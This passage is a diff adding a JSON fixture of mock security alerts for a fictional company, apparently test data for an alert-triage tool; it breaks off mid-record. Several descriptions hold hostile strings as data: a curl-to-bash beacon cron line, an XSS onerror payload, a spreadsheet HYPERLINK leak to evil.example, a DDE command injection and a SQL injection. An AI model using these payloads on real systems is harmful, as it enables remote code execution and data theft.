@@ -1,0 +1,940 @@
+[
+  {
+    "id": "evt-001",
+    "timestamp": "2025-02-18T14:32:01Z",
+    "severity": "HIGH",
+    "title": "Suspicious process execution detected on prod-web-03",
+    "description": "Process 'mimikatz.exe' was executed by user 'svc-backup' on host prod-web-03. This binary is commonly associated with credential harvesting attacks. The process was spawned from cmd.exe with parent PID 4012.",
+    "assetHostname": "prod-web-03.penguwave.internal",
+    "assetIp": "10.0.3.15",
+    "sourceIp": "10.0.5.22",
+    "tags": [
+      "credential-theft",
+      "endpoint",
+      "mimikatz"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-002",
+    "timestamp": "2025-02-18T09:15:44Z",
+    "severity": "HIGH",
+    "title": "Brute force attack on SSH — prod-db-01",
+    "description": "Over 2,400 failed SSH login attempts detected from external IP 203.0.113.89 targeting prod-db-01 within a 5-minute window. Source geo-IP resolves to Eastern Europe. The targeted accounts include root, admin, and postgres.",
+    "assetHostname": "prod-db-01.penguwave.internal",
+    "assetIp": "10.0.2.10",
+    "sourceIp": "203.0.113.89",
+    "tags": [
+      "brute-force",
+      "ssh",
+      "authentication"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-003",
+    "timestamp": "2025-02-17T22:47:33Z",
+    "severity": "HIGH",
+    "title": "Unusual outbound connection to Tor exit node",
+    "description": "Host analyst-ws-07 initiated an outbound TCP connection to known Tor exit node 185.220.101.34 on port 9001. The connection was established for 14 minutes and transferred approximately 340MB of data outbound.",
+    "assetHostname": "analyst-ws-07.penguwave.internal",
+    "assetIp": "10.0.10.15",
+    "sourceIp": "185.220.101.34",
+    "tags": [
+      "tor",
+      "exfiltration",
+      "network"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-004",
+    "timestamp": "2025-02-18T03:22:10Z",
+    "severity": "HIGH",
+    "title": "Ransomware indicator — mass file encryption detected",
+    "description": "Endpoint detection on prod-file-01 flagged rapid sequential file modifications across 12,000+ files in shared directories. File extensions changed to .locked with ransom note README_DECRYPT.txt dropped in each folder. Process: svchost_update.exe (unsigned).",
+    "assetHostname": "prod-file-01.penguwave.internal",
+    "assetIp": "10.0.8.33",
+    "sourceIp": "10.0.5.22",
+    "tags": [
+      "ransomware",
+      "encryption",
+      "endpoint"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-005",
+    "timestamp": "2025-02-17T16:05:22Z",
+    "severity": "HIGH",
+    "title": "S3 bucket policy changed to public access",
+    "description": "AWS CloudTrail detected that the bucket policy for s3://penguwave-client-data was modified to allow public read access. The change was made by IAM user 'deploy-bot' from IP 54.231.10.44. This bucket contains customer PII including names, emails, and billing addresses.",
+    "assetHostname": "s3://penguwave-client-data",
+    "assetIp": "54.231.10.44",
+    "sourceIp": "54.231.10.44",
+    "tags": [
+      "cloud",
+      "s3",
+      "misconfiguration",
+      "data-exposure"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-055",
+    "timestamp": "2025-02-12T03:20:00Z",
+    "severity": "CRITICAL",
+    "title": "Ransomware file-encryption behavior on prod-fs-01",
+    "description": "Mass file rename to .locked extension across the fileserver share; shadow copies deleted.",
+    "assetHostname": "prod-fs-01.penguwave.internal",
+    "assetIp": "10.0.2.40",
+    "sourceIp": "10.0.2.40",
+    "tags": [
+      "ransomware",
+      "endpoint"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-006",
+    "timestamp": "2025-02-18T11:30:55Z",
+    "severity": "HIGH",
+    "title": "New IAM admin role created outside change window",
+    "description": "A new IAM role 'emergency-admin-temp' with AdministratorAccess policy was created in AWS account 123456789012. The role was created by user 'jpark@penguwave.io' at 03:30 UTC, well outside the approved change window (09:00-17:00 UTC).",
+    "assetHostname": "aws-iam.penguwave.cloud",
+    "assetIp": "198.51.100.23",
+    "sourceIp": "198.51.100.23",
+    "tags": [
+      "iam",
+      "cloud",
+      "privilege-escalation"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-007",
+    "timestamp": "2025-02-17T08:12:09Z",
+    "severity": "HIGH",
+    "title": "PowerShell encoded command execution on WKSTN-042",
+    "description": "Windows event log captured PowerShell execution with -EncodedCommand flag on workstation WKSTN-042. Decoded payload reveals a reverse shell connecting to 198.51.100.77:4444. Executed under user context 'jsmith@corp.penguwave.io' with elevated privileges.",
+    "assetHostname": "wkstn-042.penguwave.internal",
+    "assetIp": "10.0.6.42",
+    "sourceIp": "198.51.100.77",
+    "tags": [
+      "powershell",
+      "reverse-shell",
+      "endpoint"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-051",
+    "timestamp": "2025-02-16T11:08:52Z",
+    "severity": "MEDIUM",
+    "title": "Firewall rule change on edge-fw-02",
+    "description": "Rule \"allow-inbound\" modified: opened ports 443, 8080, 9090 to 0.0.0.0/0.\nChange ticket CHG-4471 not found. Review required.",
+    "assetHostname": "edge-fw-02.penguwave.internal",
+    "assetIp": "10.0.1.4",
+    "sourceIp": "10.0.5.30",
+    "tags": [
+      "firewall",
+      "configuration-change",
+      "audit"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-008",
+    "timestamp": "2025-02-16T19:45:30Z",
+    "severity": "HIGH",
+    "title": "Docker exec into production container",
+    "description": "Kubernetes audit log shows 'kubectl exec -it prod-api-deployment-7f8b9c-x4k2n -- /bin/bash' executed by service account 'ci-deploy'. This is the production API container handling live customer traffic. No approved maintenance window was scheduled.",
+    "assetHostname": "prod-api-deployment-7f8b9c-x4k2n",
+    "assetIp": "10.244.1.15",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "kubernetes",
+      "container",
+      "unauthorized-access"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-009",
+    "timestamp": "2025-02-18T06:55:18Z",
+    "severity": "HIGH",
+    "title": "SSH key added to root account on prod-db-01",
+    "description": "A new SSH public key was appended to /root/.ssh/authorized_keys on prod-db-01. The key fingerprint SHA256:xK9m2... does not match any known employee keys in the inventory. Change was made via direct console access, bypassing the bastion host.",
+    "assetHostname": "prod-db-01.penguwave.internal",
+    "assetIp": "10.0.2.10",
+    "sourceIp": "10.0.2.10",
+    "tags": [
+      "ssh",
+      "persistence",
+      "unauthorized-access"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-010",
+    "timestamp": "2025-02-17T13:20:45Z",
+    "severity": "HIGH",
+    "title": "MFA bypass — session token reused after expiry",
+    "description": "Authentication system detected a valid session for user 'cmorales@penguwave.io' using a token that expired 6 hours ago. The session originated from IP 203.0.113.150 (different from the original authentication IP 10.0.10.8). Possible session hijacking or token replay attack.",
+    "assetHostname": "auth.penguwave.cloud",
+    "assetIp": "10.0.1.5",
+    "sourceIp": "203.0.113.150",
+    "tags": [
+      "authentication",
+      "mfa-bypass",
+      "session-hijack"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-011",
+    "timestamp": "2025-02-18T15:10:33Z",
+    "severity": "HIGH",
+    "title": "Unsigned binary executed by SYSTEM account",
+    "description": "An unsigned executable 'svchost_update.exe' was launched under the SYSTEM account on prod-web-02. The binary was dropped in C:\\Windows\\Temp\\ and has no digital signature. VirusTotal hash lookup returned 47/72 detections flagging it as Trojan.GenericKD.",
+    "assetHostname": "prod-web-02.penguwave.internal",
+    "assetIp": "10.0.3.14",
+    "sourceIp": "10.0.3.14",
+    "tags": [
+      "malware",
+      "endpoint",
+      "unsigned-binary"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-012",
+    "timestamp": "2025-02-16T23:58:02Z",
+    "severity": "HIGH",
+    "title": "Large data transfer to external IP — 2.3GB outbound",
+    "description": "NetFlow analysis detected a sustained outbound data transfer of 2.3GB from prod-file-01 to external IP 91.234.56.78 over HTTPS (port 443). Transfer occurred between 23:30-00:15 UTC. The destination IP is associated with a known file-sharing service frequently used for data exfiltration.",
+    "assetHostname": "prod-file-01.penguwave.internal",
+    "assetIp": "10.0.8.33",
+    "sourceIp": "91.234.56.78",
+    "tags": [
+      "exfiltration",
+      "network",
+      "data-loss"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-013",
+    "timestamp": "2025-02-18T10:22:17Z",
+    "severity": "MEDIUM",
+    "title": "Failed login spike — 47 attempts in 2 minutes",
+    "description": "Authentication logs show 47 failed login attempts for user 'admin@penguwave.io' within a 2-minute window from IP 203.0.113.89. The attempts used different passwords suggesting a credential stuffing attack. Account was not locked out due to missing lockout policy.",
+    "assetHostname": "auth.penguwave.cloud",
+    "assetIp": "10.0.1.5",
+    "sourceIp": "203.0.113.89",
+    "tags": [
+      "brute-force",
+      "authentication",
+      "credential-stuffing"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-052",
+    "timestamp": "2025-02-15T18:42:10Z",
+    "severity": "LOW",
+    "title": "User-submitted phishing report ingested",
+    "description": "Reported subject line: <img src=x onerror=alert(document.cookie)> — submitted via the abuse mailbox for triage.",
+    "assetHostname": "mail-gw-01.penguwave.internal",
+    "assetIp": "10.0.4.9",
+    "sourceIp": "203.0.113.55",
+    "tags": [
+      "email",
+      "phishing",
+      "awareness"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-014",
+    "timestamp": "2025-02-17T14:33:28Z",
+    "severity": "MEDIUM",
+    "title": "DNS tunneling pattern detected from dev-api-01",
+    "description": "DNS monitoring detected anomalous query patterns from dev-api-01. Over 800 TXT record queries to subdomains of 'data.x4k2n.xyz' in 10 minutes. Query payloads contain base64-encoded strings consistent with dns2tcp or iodine tunneling tools.",
+    "assetHostname": "dev-api-01.penguwave.internal",
+    "assetIp": "10.0.4.20",
+    "sourceIp": "10.0.4.20",
+    "tags": [
+      "dns-tunneling",
+      "exfiltration",
+      "network"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-015",
+    "timestamp": "2025-02-18T08:45:12Z",
+    "severity": "MEDIUM",
+    "title": "Port scan detected from internal host 10.0.5.22",
+    "description": "IDS alert triggered by SYN scan originating from 10.0.5.22 (dev-tools-01) targeting the 10.0.2.0/24 subnet. 1,024 ports scanned across 12 hosts in 45 seconds. Scan pattern matches nmap default SYN scan profile.",
+    "assetHostname": "dev-tools-01.penguwave.internal",
+    "assetIp": "10.0.5.22",
+    "sourceIp": "10.0.5.22",
+    "tags": [
+      "port-scan",
+      "reconnaissance",
+      "network"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "severity": "HIGH",
+    "title": "Brute force attack on SSH — prod-db-01",
+    "description": "Over 2,400 failed SSH login attempts detected from external IP 203.0.113.89 targeting prod-db-01 within a 5-minute window. Source geo-IP resolves to Eastern Europe. The targeted accounts include root, admin, and postgres.",
+    "assetHostname": "prod-db-01.penguwave.internal",
+    "assetIp": "10.0.2.10",
+    "sourceIp": "203.0.113.89",
+    "tags": [
+      "brute-force",
+      "ssh",
+      "authentication"
+    ],
+    "userId": "usr-001",
+    "id": "evt-056",
+    "timestamp": "2025-02-18T09:16:07Z"
+  },
+  {
+    "id": "evt-016",
+    "timestamp": "2025-02-17T20:15:44Z",
+    "severity": "MEDIUM",
+    "title": "Sensitive file accessed outside business hours",
+    "description": "File access audit log shows user 'mthompson@penguwave.io' accessed /shared/finance/Q4-2024-revenue.xlsx at 20:15 UTC on a Saturday. This user's role is 'junior-analyst' and they do not have a business justification for accessing financial reports.",
+    "assetHostname": "prod-file-01.penguwave.internal",
+    "assetIp": "10.0.8.33",
+    "sourceIp": "10.0.10.33",
+    "tags": [
+      "data-access",
+      "insider-threat",
+      "policy-violation"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-017",
+    "timestamp": "2025-02-18T12:05:30Z",
+    "severity": "MEDIUM",
+    "title": "Unusual database query volume from analyst-ws-07",
+    "description": "Database audit logs show 4,200 SELECT queries executed against the customers table from analyst-ws-07 in a 30-minute period. Normal baseline for this workstation is ~50 queries/hour. Queries appear to be systematically extracting all customer records page by page.",
+    "assetHostname": "prod-db-01.penguwave.internal",
+    "assetIp": "10.0.2.10",
+    "sourceIp": "10.0.10.15",
+    "tags": [
+      "data-access",
+      "database",
+      "anomaly"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-018",
+    "timestamp": "2025-02-16T17:30:22Z",
+    "severity": "MEDIUM",
+    "title": "Login from previously unseen country (RU)",
+    "description": "User 'akovacs@penguwave.io' authenticated successfully from IP 95.173.136.70 which geo-locates to Moscow, Russia. This user's historical login locations are exclusively US-based (New York, San Francisco). No travel request on file.",
+    "assetHostname": "auth.penguwave.cloud",
+    "assetIp": "10.0.1.5",
+    "sourceIp": "95.173.136.70",
+    "tags": [
+      "impossible-travel",
+      "authentication",
+      "geo-anomaly"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-019",
+    "timestamp": "2025-02-18T07:22:55Z",
+    "severity": "MEDIUM",
+    "title": "Firewall rule modified — outbound restriction removed",
+    "description": "Network firewall configuration change detected. Rule 'DENY-OUTBOUND-HIGH-RISK' was disabled by user 'netops-svc' at 07:22 UTC. This rule previously blocked outbound traffic to known malicious IP ranges. No change request ticket found in ServiceNow.",
+    "assetHostname": "fw-edge-01.penguwave.internal",
+    "assetIp": "10.0.0.1",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "firewall",
+      "configuration-change",
+      "network"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-020",
+    "timestamp": "2025-02-17T11:48:09Z",
+    "severity": "MEDIUM",
+    "title": "Privilege escalation — user added to Domain Admins",
+    "description": "Active Directory audit log shows user 'temp-contractor-01' was added to the 'Domain Admins' security group by 'helpdesk-svc'. The contractor account was created 2 days ago and is scheduled for a 1-week engagement. Domain Admin access was not part of the approved access request.",
+    "assetHostname": "dc-01.penguwave.internal",
+    "assetIp": "10.0.1.10",
+    "sourceIp": "10.0.6.50",
+    "tags": [
+      "privilege-escalation",
+      "active-directory",
+      "iam"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-021",
+    "timestamp": "2025-02-18T13:55:40Z",
+    "severity": "MEDIUM",
+    "title": "Suspicious cron job added on prod-web-03",
+    "description": "A new cron job was registered on prod-web-03 running every 5 minutes: '*/5 * * * * curl -s http://91.234.56.78/beacon | bash'. The job was added to the www-data user's crontab. This pattern is consistent with command-and-control beacon behavior.",
+    "assetHostname": "prod-web-03.penguwave.internal",
+    "assetIp": "10.0.3.15",
+    "sourceIp": "10.0.3.15",
+    "tags": [
+      "persistence",
+      "c2",
+      "endpoint"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-022",
+    "timestamp": "2025-02-17T05:30:18Z",
+    "severity": "MEDIUM",
+    "title": "VPN connection from unmanaged device",
+    "description": "VPN gateway logged a successful connection from device ID 'UNKNOWN-BYOD-7f3a' using credentials for 'rjohnson@penguwave.io'. The device does not have an MDM agent installed and its OS version (Windows 10 Build 18363) is below the minimum required patch level.",
+    "assetHostname": "vpn-gw-01.penguwave.internal",
+    "assetIp": "10.0.0.5",
+    "sourceIp": "203.0.113.200",
+    "tags": [
+      "vpn",
+      "unmanaged-device",
+      "policy-violation"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-053",
+    "timestamp": "2025-02-14T07:30:19Z",
+    "severity": "MEDIUM",
+    "title": "Suspicious filename observed in upload scan",
+    "description": "=HYPERLINK(\"http://evil.example/?leak=\"&A1,\"invoice\") detected as the original filename of an uploaded attachment.",
+    "assetHostname": "upload-svc-01.penguwave.internal",
+    "assetIp": "10.0.6.12",
+    "sourceIp": "198.51.100.23",
+    "tags": [
+      "data-exposure",
+      "anomaly"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-023",
+    "timestamp": "2025-02-18T16:40:25Z",
+    "severity": "MEDIUM",
+    "title": "API rate limit exceeded — /api/v2/customers endpoint",
+    "description": "Rate limiting triggered on the /api/v2/customers endpoint. API key 'pk_live_a8f3e2b1' made 15,000 requests in 10 minutes (limit: 1,000/min). Requests originated from IP 104.28.55.12 and appear to be scraping customer data sequentially by ID.",
+    "assetHostname": "api-gateway.penguwave.cloud",
+    "assetIp": "10.0.1.20",
+    "sourceIp": "104.28.55.12",
+    "tags": [
+      "api-abuse",
+      "rate-limit",
+      "data-scraping"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-024",
+    "timestamp": "2025-02-16T14:20:33Z",
+    "severity": "MEDIUM",
+    "title": "Certificate transparency log — unexpected subdomain",
+    "description": "Certificate Transparency monitoring detected a new TLS certificate issued for 'admin-staging.penguwave.io' by Let's Encrypt. This subdomain is not in the approved DNS inventory and does not resolve to any known infrastructure. Possible shadow IT or attacker-controlled infrastructure.",
+    "assetHostname": "admin-staging.penguwave.io",
+    "assetIp": "unknown",
+    "sourceIp": "unknown",
+    "tags": [
+      "certificate",
+      "shadow-it",
+      "reconnaissance"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-025",
+    "timestamp": "2025-02-18T04:10:50Z",
+    "severity": "MEDIUM",
+    "title": "Lateral movement detected — SMB admin share access",
+    "description": "Windows security event log shows successful authentication to \\\\prod-file-01\\C$ admin share from wkstn-042 using NTLM authentication. The source account 'jsmith' does not have documented admin access to this server. Access pattern suggests pass-the-hash technique.",
+    "assetHostname": "prod-file-01.penguwave.internal",
+    "assetIp": "10.0.8.33",
+    "sourceIp": "10.0.6.42",
+    "tags": [
+      "lateral-movement",
+      "smb",
+      "pass-the-hash"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-057",
+    "timestamp": "2099-12-31T23:59:59Z",
+    "severity": "MEDIUM",
+    "title": "Clock drift detected on ntp-01",
+    "description": "Event timestamp is far in the future; source host clock may be misconfigured.",
+    "assetHostname": "ntp-01.penguwave.internal",
+    "assetIp": "10.0.1.9",
+    "sourceIp": "10.0.1.9",
+    "tags": [
+      "configuration-change",
+      "anomaly"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-026",
+    "timestamp": "2025-02-17T09:55:14Z",
+    "severity": "MEDIUM",
+    "title": "GitHub repository made public accidentally",
+    "description": "GitHub audit log shows repository 'penguwave/internal-api-keys' visibility was changed from private to public by user 'dev-intern-02'. The repository contains API keys, database connection strings, and internal service credentials. Visibility was reverted after 23 minutes.",
+    "assetHostname": "github.com/penguwave",
+    "assetIp": "140.82.121.4",
+    "sourceIp": "10.0.10.60",
+    "tags": [
+      "secret-exposure",
+      "github",
+      "misconfiguration"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-027",
+    "timestamp": "2025-02-18T14:05:28Z",
+    "severity": "MEDIUM",
+    "title": "Outbound ICMP tunnel detected",
+    "description": "Network monitoring detected sustained ICMP echo request/reply traffic between dev-tools-01 and external IP 45.33.32.156. Packet payload analysis reveals non-standard data in ICMP payload fields, consistent with icmpsh or similar ICMP tunneling tools. 180MB transferred over 2 hours.",
+    "assetHostname": "dev-tools-01.penguwave.internal",
+    "assetIp": "10.0.5.22",
+    "sourceIp": "45.33.32.156",
+    "tags": [
+      "icmp-tunnel",
+      "exfiltration",
+      "network"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-028",
+    "timestamp": "2025-02-16T21:30:45Z",
+    "severity": "MEDIUM",
+    "title": "Service account password unchanged for 180+ days",
+    "description": "Password audit scan detected that service account 'svc-backup' has not had its password rotated in 187 days, violating the 90-day rotation policy. This account has read access to all production databases and backup storage. Last password change: 2024-08-15.",
+    "assetHostname": "dc-01.penguwave.internal",
+    "assetIp": "10.0.1.10",
+    "sourceIp": "10.0.1.10",
+    "tags": [
+      "password-policy",
+      "service-account",
+      "compliance"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-029",
+    "timestamp": "2025-02-18T09:30:22Z",
+    "severity": "MEDIUM",
+    "title": "WAF bypass attempt — SQL injection in User-Agent header",
+    "description": "Web Application Firewall logged a blocked request to /api/v2/search with SQL injection payload in the User-Agent header: 'Mozilla/5.0' OR 1=1; DROP TABLE users;--'. Source IP 185.143.223.10 has made 340 similar attempts in the last hour targeting different header fields.",
+    "assetHostname": "waf-01.penguwave.cloud",
+    "assetIp": "10.0.1.25",
+    "sourceIp": "185.143.223.10",
+    "tags": [
+      "sql-injection",
+      "waf",
+      "web-attack"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-030",
+    "timestamp": "2025-02-17T18:20:11Z",
+    "severity": "MEDIUM",
+    "title": "Anomalous process tree on prod-api-01",
+    "description": "EDR detected an unusual process chain on prod-api-01: nginx → sh → python3 → curl. The python3 process is running a script from /tmp/.hidden/exfil.py which makes HTTP POST requests to an external endpoint every 30 seconds. Process owner: www-data.",
+    "assetHostname": "prod-api-01.penguwave.internal",
+    "assetIp": "10.0.3.20",
+    "sourceIp": "10.0.3.20",
+    "tags": [
+      "process-anomaly",
+      "endpoint",
+      "webshell"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-031",
+    "timestamp": "2025-02-18T11:15:38Z",
+    "severity": "MEDIUM",
+    "title": "Email forwarding rule created to external address",
+    "description": "Microsoft 365 audit log detected a new inbox forwarding rule created by 'lchen@penguwave.io'. All incoming emails matching 'invoice OR payment OR wire transfer' are being forwarded to external address 'lchen.backup@protonmail.com'. Rule was created via OWA from IP 10.0.10.22.",
+    "assetHostname": "outlook.office365.com",
+    "assetIp": "52.96.0.0",
+    "sourceIp": "10.0.10.22",
+    "tags": [
+      "email",
+      "forwarding-rule",
+      "insider-threat"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-032",
+    "timestamp": "2025-02-17T07:45:55Z",
+    "severity": "MEDIUM",
+    "title": "Container image pulled from untrusted registry",
+    "description": "Kubernetes audit log shows pod 'data-processor-batch-7x2k' was created using image 'docker.io/randomuser123/data-tools:latest' instead of the approved internal registry (registry.penguwave.internal). The image has no vulnerability scan results and was pulled without digest verification.",
+    "assetHostname": "k8s-worker-03.penguwave.internal",
+    "assetIp": "10.244.3.8",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "kubernetes",
+      "supply-chain",
+      "container"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-033",
+    "timestamp": "2025-02-18T02:10:05Z",
+    "severity": "LOW",
+    "title": "Routine vulnerability scan completed",
+    "description": "Scheduled weekly vulnerability scan completed for the 10.0.0.0/16 network range. Scan duration: 4 hours 22 minutes. Results: 3 critical, 12 high, 45 medium, 128 low findings. Full report available in the vulnerability management portal.",
+    "assetHostname": "vuln-scanner-01.penguwave.internal",
+    "assetIp": "10.0.1.180",
+    "sourceIp": "10.0.1.180",
+    "tags": [
+      "vulnerability-scan",
+      "compliance",
+      "routine"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-034",
+    "timestamp": "2025-02-17T10:30:20Z",
+    "severity": "LOW",
+    "title": "SSL certificate expiring in 14 days — api.penguwave.io",
+    "description": "Certificate monitoring alert: the TLS certificate for api.penguwave.io expires on 2025-03-03. Certificate was issued by DigiCert and covers *.penguwave.io. Auto-renewal is configured but the last renewal attempt failed due to DNS validation timeout.",
+    "assetHostname": "api.penguwave.io",
+    "assetIp": "10.0.1.20",
+    "sourceIp": "10.0.1.180",
+    "tags": [
+      "certificate",
+      "expiry",
+      "maintenance"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-054",
+    "timestamp": "2025-02-13T15:11:03Z",
+    "severity": "LOW",
+    "title": "Endpoint hostname anomaly",
+    "description": "+cmd|'/C calc'!A0 reported as the NetBIOS name of a newly enrolled device pending review.",
+    "assetHostname": "mdm-01.penguwave.internal",
+    "assetIp": "10.0.7.21",
+    "sourceIp": "10.0.7.21",
+    "tags": [
+      "device-enrollment",
+      "anomaly"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-035",
+    "timestamp": "2025-02-18T08:00:15Z",
+    "severity": "LOW",
+    "title": "New device enrolled in MDM",
+    "description": "A new MacBook Pro (serial: C02ZR3XXMD6T) was enrolled in the MDM platform by user 'newanalyst@penguwave.io'. Device is running macOS 14.3 with FileVault enabled. Compliance check passed: all required security agents are installed.",
+    "assetHostname": "C02ZR3XXMD6T",
+    "assetIp": "10.0.10.78",
+    "sourceIp": "10.0.10.78",
+    "tags": [
+      "mdm",
+      "device-enrollment",
+      "routine"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-036",
+    "timestamp": "2025-02-17T15:22:40Z",
+    "severity": "LOW",
+    "title": "EDR agent updated on workstation fleet",
+    "description": "Endpoint Detection and Response agent version 4.8.2 was successfully deployed to 142 of 145 workstations. 3 workstations failed to update: wkstn-012 (offline), wkstn-067 (disk full), wkstn-099 (agent service stopped). Retry scheduled for next maintenance window.",
+    "assetHostname": "edr-console.penguwave.internal",
+    "assetIp": "10.0.1.38",
+    "sourceIp": "10.0.1.38",
+    "tags": [
+      "edr",
+      "agent-update",
+      "maintenance"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-037",
+    "timestamp": "2025-02-18T06:15:30Z",
+    "severity": "LOW",
+    "title": "Backup job completed successfully — prod-db-01",
+    "description": "Nightly database backup for prod-db-01 completed at 06:15 UTC. Backup size: 12.4GB (compressed). Backup was encrypted with AES-256 and uploaded to s3://penguwave-backups/db/2025-02-18/. Integrity check: SHA256 verified. Retention: 90 days.",
+    "assetHostname": "prod-db-01.penguwave.internal",
+    "assetIp": "10.0.2.10",
+    "sourceIp": "10.0.2.10",
+    "tags": [
+      "backup",
+      "database",
+      "routine"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-058",
+    "timestamp": "2025-02-11T13:05:44Z",
+    "severity": "HIGH",
+    "title": "Orphaned alert from decommissioned sensor",
+    "description": "Alert ingested with no associated owner; sensor was retired last quarter.",
+    "assetHostname": "legacy-ids-02.penguwave.internal",
+    "assetIp": "10.0.9.2",
+    "sourceIp": null,
+    "tags": [
+      "anomaly"
+    ],
+    "userId": null
+  },
+  {
+    "id": "evt-038",
+    "timestamp": "2025-02-16T12:45:18Z",
+    "severity": "LOW",
+    "title": "Password reset request — standard procedure",
+    "description": "User 'dkim@penguwave.io' submitted a password reset request via the self-service portal. Identity verified via SMS OTP to registered phone number. New password meets complexity requirements. Previous password was 45 days old.",
+    "assetHostname": "auth.penguwave.cloud",
+    "assetIp": "10.0.1.5",
+    "sourceIp": "10.0.10.45",
+    "tags": [
+      "password-reset",
+      "authentication",
+      "routine"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-039",
+    "timestamp": "2025-02-18T13:10:22Z",
+    "severity": "LOW",
+    "title": "Firewall rule audit — quarterly review completed",
+    "description": "Quarterly firewall rule review completed for fw-edge-01. 234 rules reviewed, 12 rules flagged as overly permissive, 5 rules marked for removal (associated with decommissioned services). Report submitted to security-team@penguwave.io.",
+    "assetHostname": "fw-edge-01.penguwave.internal",
+    "assetIp": "10.0.0.1",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "firewall",
+      "audit",
+      "compliance"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-040",
+    "timestamp": "2025-02-17T16:55:08Z",
+    "severity": "LOW",
+    "title": "Phishing simulation — campaign results",
+    "description": "Monthly phishing simulation campaign 'February-2025-Invoice' completed. 450 emails sent, 23 users clicked the link (5.1%), 8 users submitted credentials (1.8%). Users who failed have been enrolled in mandatory security awareness training.",
+    "assetHostname": "phishing-sim.penguwave.internal",
+    "assetIp": "10.0.1.50",
+    "sourceIp": "10.0.1.50",
+    "tags": [
+      "phishing",
+      "simulation",
+      "training"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-041",
+    "timestamp": "2025-02-18T10:40:15Z",
+    "severity": "LOW",
+    "title": "DNS record change — CNAME updated for staging",
+    "description": "DNS change detected: staging.penguwave.io CNAME updated from 'staging-old.herokuapp.com' to 'staging-v2.penguwave.cloud'. Change made by 'infra-bot' via Terraform apply. Change request CR-2025-0218 approved by platform-team.",
+    "assetHostname": "dns.penguwave.cloud",
+    "assetIp": "10.0.1.2",
+    "sourceIp": "10.0.1.100",
+    "tags": [
+      "dns",
+      "configuration-change",
+      "routine"
+    ],
+    "userId": "usr-002"
+  },
+  {
+    "id": "evt-042",
+    "timestamp": "2025-02-16T09:20:33Z",
+    "severity": "LOW",
+    "title": "Access review completed — Q1 2025",
+    "description": "Quarterly access review for Q1 2025 completed. 89 user accounts reviewed across 12 systems. 4 accounts flagged for excessive permissions (downgraded), 2 accounts identified as orphaned (disabled). Compliance status: PASS.",
+    "assetHostname": "iam-portal.penguwave.cloud",
+    "assetIp": "10.0.1.5",
+    "sourceIp": "10.0.1.5",
+    "tags": [
+      "access-review",
+      "compliance",
+      "iam"
+    ],
+    "userId": "usr-001"
+  },
+  {
+    "id": "evt-043",
+    "timestamp": "2025-02-18T07:50:44Z",
+    "severity": "LOW",
+    "title": "Log ingestion rate normal — Splunk health check",
+    "description": "SIEM health check completed. Current log ingestion rate: 2.4GB/day (within normal range of 2.0-3.0GB/day). All log sources reporting: 14/14 active. Indexer cluster health: green. Search head response time: 1.2s average.",
+    "assetHostname": "splunk-sh-01.penguwave.internal",
+    "assetIp": "10.0.1.60",
+    "sourceIp": "10.0.1.60",
+    "tags": [
+      "siem",
+      "health-check",
+      "monitoring"
+    ],
+    "userId": "usr-003"
+  },
+  {
+    "id": "evt-059",
+    "timestamp": "2025-02-10T08:00:00Z",
+    "severity": "LOW",
+    "title": "Scheduled antivirus definition update completed",
+    "description": "",
+    "assetHostname": "edr-mgmt-01.penguwave.internal",
+    "assetIp": "10.0.1.50",
+    "sourceIp": "10.0.1.50",
+    "tags": [
+      "antivirus",
+      "agent-update"
+    ],
